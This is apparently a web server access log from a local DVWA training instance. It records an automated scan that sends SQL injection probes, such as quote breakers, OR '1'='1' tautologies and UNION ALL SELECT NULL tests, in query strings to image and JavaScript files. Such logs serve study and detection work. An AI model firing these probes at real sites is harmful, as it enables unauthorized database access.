172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=%27 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query%27 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=%22 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query%22 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=%3B HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query%3B HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=%29 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query%29 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query+AND+1%3D1+--+ HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query+AND+1%3D2+--+ HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query+OR+1%3D1+--+ HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query+AND+1%3D2+--+ HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query+OR+1%3D1+--+ HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /docs/DVWA_v1.3.pdf?query=query%22 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/spanner.png HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=%27 HTTP/1.1" 301 546 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=query%27 HTTP/1.1" 301 556 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=%22 HTTP/1.1" 301 546 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=query%22 HTTP/1.1" 301 556 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=%3B HTTP/1.1" 301 546 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=query%3B HTTP/1.1" 301 556 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=%29 HTTP/1.1" 301 546 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=query%29 HTTP/1.1" 301 556 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=query+AND+1%3D1+--+ HTTP/1.1" 301 578 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 301 608 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=query%22+AND+%221%22%3D%221%22+--+ HTTP/1.1" 301 608 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=query+AND+1%3D1 HTTP/1.1" 301 570 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=query%27+AND+%271%27%3D%271 HTTP/1.1" 301 594 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=query%22+AND+%221%22%3D%221 HTTP/1.1" 301 594 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 602 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 608 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 608 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 608 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 614 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=%27 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%27 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=%22 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%22 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=%3B HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%3B HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=%29 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%29 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query+AND+1%3D1+--+ HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query+AND+1%3D2+--+ HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query+OR+1%3D1+--+ HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query+AND+1%3D2+--+ HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query+OR+1%3D1+--+ HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 877 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=%27 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query%27 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=%22 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query%22 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=%3B HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query%3B HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=%29 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query%29 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query+AND+1%3D1+--+ HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query+AND+1%3D2+--+ HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query+OR+1%3D1+--+ HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query+AND+1%3D2+--+ HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query+OR+1%3D1+--+ HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
